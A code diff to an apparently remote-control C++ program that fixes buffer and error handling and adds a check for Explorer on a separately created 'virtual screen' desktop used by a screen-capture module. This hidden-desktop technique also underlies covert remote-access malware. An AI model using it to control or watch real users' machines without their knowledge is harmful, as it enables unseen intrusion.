@@ -148,7 +148,7 @@ bool LaunchApplication(TCHAR* pszApplicationFilePath, TCHAR* pszDesktopName)
         TCHAR szDirectoryName[MAX_PATH * 2] = { 0 };
         TCHAR szExplorerFile[MAX_PATH * 2] = { 0 };
 
-        strcpy_s(szDirectoryName, strlen(pszApplicationFilePath) + 1, pszApplicationFilePath);
+        strcpy_s(szDirectoryName, sizeof(szDirectoryName), pszApplicationFilePath);
 
         std::wstring path = ConvertToWString(pszApplicationFilePath);
         if (!PathIsExe(path.c_str()))
@@ -161,6 +161,7 @@ bool LaunchApplication(TCHAR* pszApplicationFilePath, TCHAR* pszDesktopName)
         sInfo.lpDesktop = pszDesktopName;
 
         //Launching a application into desktop
+        SetLastError(0);
         BOOL bCreateProcessReturn = CreateProcess(pszApplicationFilePath,
                                     NULL,
                                     NULL,
@@ -171,14 +172,15 @@ bool LaunchApplication(TCHAR* pszApplicationFilePath, TCHAR* pszDesktopName)
                                     szDirectoryName,
                                     &sInfo,
                                     &pInfo);
+        DWORD err = GetLastError();
         CloseHandle(pInfo.hProcess);
         CloseHandle(pInfo.hThread);
         TCHAR* pszError = NULL;
         FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
-                      NULL, GetLastError(), 0, reinterpret_cast<LPTSTR>(&pszError), 0, NULL);
+                      NULL, err, 0, reinterpret_cast<LPTSTR>(&pszError), 0, NULL);
 
         if (pszError) {
-            Mprintf("CreateProcess [%s] failed: %s\n", pszApplicationFilePath, pszError);
+            Mprintf("CreateProcess [%s] %s: %s\n", pszApplicationFilePath, err ? "failed" : "succeed", pszError);
             LocalFree(pszError);  // 释放内存
         }
 
@@ -190,6 +192,41 @@ bool LaunchApplication(TCHAR* pszApplicationFilePath, TCHAR* pszDesktopName)
     }
 
     return bReturn;
+}
+
+// 检查指定桌面（hDesk）中是否存在目标进程（targetExeName）
+BOOL IsProcessRunningInDesktop(HDESK hDesk, const char* targetExeName) {
+	// 切换到目标桌面
+	if (!SetThreadDesktop(hDesk)) {
+		return FALSE;
+	}
+
+	// 枚举目标桌面的所有窗口
+	BOOL bFound = FALSE;
+	std::pair<const char*, BOOL*> data(targetExeName, &bFound);
+	EnumDesktopWindows(hDesk, [](HWND hWnd, LPARAM lParam) -> BOOL {
+		auto pData = reinterpret_cast<std::pair<const char*, BOOL*>*>(lParam);
+
+		DWORD dwProcessId;
+		GetWindowThreadProcessId(hWnd, &dwProcessId);
+
+		// 获取进程名
+		HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwProcessId);
+		if (hProcess) {
+			char exePath[MAX_PATH];
+			DWORD size = MAX_PATH;
+			if (QueryFullProcessImageName(hProcess, 0, exePath, &size)) {
+				if (_stricmp(exePath, pData->first) == 0) {
+					*(pData->second) = TRUE;
+					return FALSE; // 终止枚举
+				}
+			}
+			CloseHandle(hProcess);
+		}
+		return TRUE; // 继续枚举
+		}, reinterpret_cast<LPARAM>(&data));
+
+	return bFound;
 }
 
 void CScreenManager::InitScreenSpy()
@@ -212,25 +249,29 @@ void CScreenManager::InitScreenSpy()
     Mprintf("CScreenManager: Type %d Algorithm: %d\n", DXGI, int(algo));
     if (DXGI == USING_VIRTUAL) {
         m_virtual = TRUE;
-        HDESK hDesk = SelectDesktop((char*)m_DesktopID.c_str());
-        if (!hDesk) {
-            if (hDesk = CreateDesktop(m_DesktopID.c_str(), NULL, NULL, 0, GENERIC_ALL, NULL)) {
-                Mprintf("创建虚拟屏幕成功: %s\n", m_DesktopID.c_str());
-                TCHAR szExplorerFile[MAX_PATH * 2] = { 0 };
-                GetWindowsDirectory(szExplorerFile, MAX_PATH * 2 - 1);
-                strcat_s(szExplorerFile, MAX_PATH * 2 - 1, "\\Explorer.Exe");
-                if (!LaunchApplication(szExplorerFile, (char*)m_DesktopID.c_str())) {
-                    Mprintf("启动资源管理器失败[%s]!!!\n", m_DesktopID.c_str());
-                }
-            } else {
-                Mprintf("创建虚拟屏幕失败: %s\n", m_DesktopID.c_str());
-            }
-        } else {
-            Mprintf("打开虚拟屏幕成功: %s\n", m_DesktopID.c_str());
-        }
-        if (hDesk) {
-            SetThreadDesktop(g_hDesk = hDesk);
-        }
+		HDESK hDesk = SelectDesktop((char*)m_DesktopID.c_str());
+		if (!hDesk) {
+			hDesk = CreateDesktop(m_DesktopID.c_str(), NULL, NULL, 0, GENERIC_ALL, NULL);
+			Mprintf("创建虚拟屏幕%s: %s\n", m_DesktopID.c_str(), hDesk ? "成功" : "失败");
+		}
+		else {
+			Mprintf("打开虚拟屏幕成功: %s\n", m_DesktopID.c_str());
+		}
+		if (hDesk) {
+			TCHAR szExplorerFile[MAX_PATH * 2] = { 0 };
+			GetWindowsDirectory(szExplorerFile, MAX_PATH * 2 - 1);
+			strcat_s(szExplorerFile, MAX_PATH * 2 - 1, "\\Explorer.Exe");
+			if (!IsProcessRunningInDesktop(hDesk, szExplorerFile))
+			{
+				if (!LaunchApplication(szExplorerFile, (char*)m_DesktopID.c_str())) {
+					Mprintf("启动资源管理器失败[%s]!!!\n", m_DesktopID.c_str());
+				}
+			}
+			else {
+				Mprintf("虚拟屏幕的资源管理器已在运行[%s].\n", m_DesktopID.c_str());
+			}
+			SetThreadDesktop(g_hDesk = hDesk);
+		}
     } else {
         HDESK hDesk = OpenActiveDesktop();
         if (hDesk) {
